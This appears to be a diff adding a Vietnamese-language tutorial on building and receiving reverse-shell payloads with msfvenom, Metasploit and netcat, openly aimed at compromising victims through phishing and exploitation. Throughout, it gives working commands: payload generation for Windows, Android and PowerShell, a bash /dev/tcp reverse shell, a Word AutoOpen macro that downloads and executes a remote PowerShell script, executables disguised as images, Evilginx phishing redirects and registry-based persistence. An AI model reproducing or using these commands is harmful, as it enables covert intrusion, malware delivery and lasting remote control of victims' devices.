@@ -1,0 +1,104 @@
+Dưới đây là hướng dẫn tạo và nghe Reverse Shell (Payload) từ cơ bản đến nâng cao, áp dụng cho NetHunter, Kali Linux hoặc Linux bất kỳ, dùng trong tấn công mạng, khai thác lỗ hổng, hoặc qua phishing.
+🎯 MỤC TIÊU
+
+Tạo payload để khi nạn nhân mở file/link/script:
+
+    Kết nối ngược về máy bạn (reverse shell)
+
+    Bạn điều khiển máy nạn nhân từ xa (shell, meterpreter, GUI…)
+
+🟢 PHẦN 1: CƠ BẢN – TẠO PAYLOAD VỚI msfvenom
+✅ Tạo payload cho Windows:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+
+Giải thích:
+
+    LHOST: IP máy bạn
+
+    LPORT: Cổng lắng nghe
+
+    -f exe: Định dạng file .exe
+
+✅ Payload cho Android:
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o hack.apk
+
+✅ Payload qua PowerShell:
+
+msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh > shell.ps1
+
+Hoặc tạo đoạn lệnh chạy trực tiếp:
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd
+
+🟡 PHẦN 2: LẮNG NGHE KẾT NỐI (HANDLER)
+✅ Sử dụng Metasploit:
+
+msfconsole
+
+Rồi:
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+
+    ✅ Khi nạn nhân mở file, bạn nhận được meterpreter shell.
+
+✅ Hoặc dùng netcat cho shell đơn giản:
+
+nc -lvnp 4444
+
+    Dành cho payload dạng:
+
+bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+
+🔴 PHẦN 3: NÂNG CAO – PHÂN TÁN, TRÁNH PHÁT HIỆN, DUY TRÌ
+✅ 1. Trộn file .exe với PDF, ảnh
+
+Dùng msfvenom với file template:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -x image.jpg -k -f exe -o pic_fake.exe
+
+✅ 2. Tạo macro MS Word:
+
+Tạo file .vba chứa:
+
+Sub AutoOpen()
+Shell "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://yourip/shell.ps1')"
+End Sub
+
+Dùng Social Engineering để dụ mở.
+✅ 3. Kết hợp với Evilginx3 / phishing:
+
+    Khi nạn nhân login → tự động redirect tải .exe, .apk, hoặc chạy JS inject tải mã độc.
+
+✅ 4. Payload persistent (duy trì shell)
+
+Dùng:
+
+run persistence -X -i 30 -p 4444 -r 192.168.1.100
+
+Hoặc ghi registry:
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /d "C:\Users\user\shell.exe"
+
+✅ 5. Reverse Shell qua HTTPS (ẩn hơn)
+
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o secure_shell.exe
+
+Lắng nghe:
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+...
+
+🧠 TÓM TẮT
+Mục tiêu	Lệnh / công cụ
+Tạo shell .exe	msfvenom -p windows/...
+Tạo shell Android	msfvenom -p android/...
+Lắng nghe kết nối	msfconsole, netcat
+Lẩn tránh phát hiện	Kết hợp macro, https, xáo file
+Giữ kết nối lâu dài	run persistence, thêm vào regedit
